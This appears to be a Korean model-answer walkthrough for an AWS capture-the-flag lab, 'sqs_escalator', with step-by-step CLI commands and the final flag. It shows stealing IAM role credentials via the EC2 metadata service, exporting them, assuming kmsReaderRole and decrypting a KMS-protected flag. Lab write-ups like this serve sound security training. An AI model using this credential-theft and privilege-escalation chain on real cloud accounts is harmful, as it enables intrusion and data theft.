# [sqs_escalator] 모범 답안  
<br/>
답안을 보고 풀이를 직접 진행할 수 있도록 진행 과정을 상세하게 작성.  
<br/><br/>

1. Terraform을 통해 생성된 Access Key와 Secret Key를 사용하여 AWS CLI 프로파일을 구성한다.  
```bash
aws configure --profile yejin
```

2. 설정이 올바르게 되었는지 확인한다.  
```bash
aws sts get-caller-identity --profile yejin
```

3. SQS 메시지를 수신하여 EC2 접속 정보, PEM 경로, 플래그 경로, AssumeRole 힌트를 획득한다.  
```bash
aws sqs receive-message \
  --queue-url <SQS_URL> \
  --profile yejin
```

4. PEM 키 파일을 S3에서 다운로드 후 SSH 접속을 시도한다.  
```bash
aws s3 cp s3://<bucket-name>/ec2-access.pem ./ec2-access.pem --profile yejin
chmod 400 ec2-access.pem

ssh -i ec2-access.pem ec2-user@<EC2_IP>
```

5. EC2 내부에서 메타데이터 서비스를 통해 IAM 역할 자격 증명을 탈취한다.  
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<EC2-ROLE-NAME>
```

6. 탈취한 자격 증명을 환경 변수로 등록한다.  
```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>
```

7. 암호화된 flag 파일을 S3에서 다운로드한다.  
```bash
aws s3 cp s3://<bucket-name>/flag.enc ./flag.enc
```

8. 복호화를 시도하나 실패한다.  
```bash
aws kms decrypt \
  --ciphertext-blob fileb://flag.enc \
  --output text --query Plaintext
```

9. AssumeRole을 수행하여 kmsReaderRole 권한을 획득한다.  
```bash
creds=$(aws sts assume-role \
  --role-arn arn:aws:iam::<account-id>:role/kmsReaderRole \
  --role-session-name attacker-session)

export AWS_ACCESS_KEY_ID=$(echo $creds | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $creds | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $creds | jq -r '.Credentials.SessionToken')
```

10. 획득한 권한으로 다시 KMS 복호화를 시도하여 flag를 획득한다.  
```bash
aws kms decrypt \
  --ciphertext-blob fileb://flag.enc \
  --output text --query Plaintext | base64 -d
```

<br/><br/>
FLAG{escalation_success_kms_flag}